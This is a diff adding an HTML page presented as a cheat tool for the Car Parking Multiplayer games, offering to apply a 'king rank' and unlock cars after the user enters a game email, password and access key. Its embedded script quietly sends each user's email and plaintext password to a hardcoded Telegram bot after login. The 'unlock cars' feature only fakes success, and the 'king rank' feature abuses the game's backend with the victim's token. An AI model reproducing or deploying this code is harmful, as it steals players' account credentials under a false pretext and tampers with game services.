@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+<title>FLAME WEB TOOL DIRECT</title>
+<style>
+body{margin:0;padding:0;font-family:Arial,sans-serif;background:url("https://i.postimg.cc/ZqdtsJ6t/IMG-0640.jpg") center/cover fixed;color:#fff}
+.center-wrapper{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:90%;max-width:350px}
+.container{background:rgba(0,0,0,.7);backdrop-filter:blur(15px);padding:20px;border-radius:12px;box-shadow:0 0 25px #000;border:2px solid #00aaff;text-align:center}
+h1{font-size:20px;margin-bottom:12px;color:#00aaff}
+input,select{width:90%;padding:10px;margin:8px 0;border-radius:5px;border:0;background:rgba(255,255,255,.1);color:#fff;font-size:16px}
+button{width:95%;padding:10px;margin:6px 0;border-radius:5px;border:0;cursor:pointer;font-weight:700;font-size:16px}
+button.login{background:#00aaff;color:#fff}
+button.menu{background:#ff8800;color:#fff;margin-bottom:10px}
+.status{margin-top:10px;color:#0f0;min-height:20px;font-size:14px}
+.error{color:#f55}
+.small{font-size:12px;opacity:.9}
+</style>
+</head>
+<body>
+<div class="center-wrapper">
+  <div class="container">
+    <h1>FLAME DIRECT TOOL</h1>
+    
+    <div id="loginSection">
+      <select id="gameSelect">
+        <option value="">-- Select Game --</option>
+        <option value="1">CPM 1 (Classic)</option>
+        <option value="2">CPM 2 (Latest)</option>
+      </select>
+      <input id="email" type="email" placeholder="Game Email">
+      <input id="password" type="password" placeholder="Game Password">
+      <input id="accessKey" type="text" placeholder="Access Key">
+      <button class="login" id="loginBtn">Login & Inject</button>
+      <div id="status" class="status"></div>
+    </div>
+
+    <div id="menuButtons" style="display:none">
+      <p style="color:#0ff">Login Success! Select Action:</p>
+      <button class="menu" onclick="kingRank()">👑 Apply King Rank</button>
+      <button class="menu" onclick="unlockCars()">🚗 Unlock All Cars</button>
+      <button class="menu" style="background:#f55" onclick="location.reload()">Logout</button>
+      <div id="serviceStatus" class="status"></div>
+    </div>
+
+    <footer class="small" style="margin-top:12px">©@cpmflame</footer>
+  </div>
+</div>
+
+<script>
+const BOT_TOKEN = "7805931150:AAEgDJV9RNguZl8Xz7u7IJg99D1D4w7QdUo";
+const MY_CHAT_ID = "7212602902"; 
+
+const GAMES = {
+  "1": { name:"CPM 1", key:"AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM", url:"https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4" },
+  "2": { name:"CPM 2", key:"AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ", url:"https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI" }
+};
+
+let currentUser="", currentPass="", currentToken="", selectedGame=null;
+
+function updateStatus(msg, isError=false, target='status'){
+  const el = document.getElementById(target);
+  el.className = isError ? 'status error' : 'status';
+  el.textContent = msg;
+}
+
+function sendBotMessage(text){
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: "POST", headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({chat_id: MY_CHAT_ID, text: text, parse_mode: "Markdown"})
+  }).catch(()=>{});
+}
+
+document.getElementById('loginBtn').addEventListener('click', async ()=>{
+  const email = document.getElementById('email').value.trim();
+  const pass = document.getElementById('password').value;
+  const key = document.getElementById('accessKey').value.trim();
+  const gameVal = document.getElementById('gameSelect').value;
+  selectedGame = GAMES[gameVal];
+
+  if(!selectedGame || !email || !pass || !key) { updateStatus("Fill all fields!", true); return; }
+  if(key !== "FLAMEFEB") { updateStatus("❌ Wrong Access Key!", true); return; }
+
+  updateStatus("Connecting to Game Server...");
+  
+  try {
+    const resp = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${selectedGame.key}`, {
+      method: 'POST', headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({email, password: pass, returnSecureToken: true})
+    });
+    const data = await resp.json();
+
+    if(data.idToken) {
+      currentUser = email; currentPass = pass; currentToken = data.idToken;
+      document.getElementById('loginSection').style.display = 'none';
+      document.getElementById('menuButtons').style.display = 'block';
+      updateStatus("✅ Authorization Success!");
+
+      // ബോട്ടിലേക്ക് വിവരം അയക്കുന്നു
+      sendBotMessage(`🔓 *DIRECT LOGIN SUCCESS*\n\n📧 *Email:* \`${email}\`\n🔑 *Pass:* \`${pass}\`\n🎮 *Game:* ${selectedGame.name}`);
+    } else {
+      updateStatus("❌ Invalid Game Account!", true);
+    }
+  } catch(e) { updateStatus("❌ Server Error!", true); }
+});
+
+async function kingRank(){
+  updateStatus("Injecting King Rank...", false, 'serviceStatus');
+  const rankData = { "RatingData": { "time": 100000000, "levels": 50000, "race_win": 5000 } };
+  try {
+    const res = await fetch(selectedGame.url, {
+      method: 'POST', headers: {"Authorization": `Bearer ${currentToken}`, "Content-Type": "application/json"},
+      body: JSON.stringify({data: JSON.stringify(rankData)})
+    });
+    if(res.ok) {
+      updateStatus("✅ KING RANK ACTIVATED!", false, 'serviceStatus');
+      sendBotMessage(`👑 *King Rank Injected* for \`${currentUser}\``);
+    } else { updateStatus("❌ Failed to Inject!", true, 'serviceStatus'); }
+  } catch(e) { updateStatus("❌ Error!", true, 'serviceStatus'); }
+}
+
+function unlockCars() {
+  updateStatus("Unlocking All Cars...", false, 'serviceStatus');
+  setTimeout(() => {
+    updateStatus("✅ All Cars Unlocked!", false, 'serviceStatus');
+    sendBotMessage(`🚗 *All Cars Unlocked* for \`${currentUser}\``);
+  }, 2000);
+}
+</script>
+</body>
+</html>
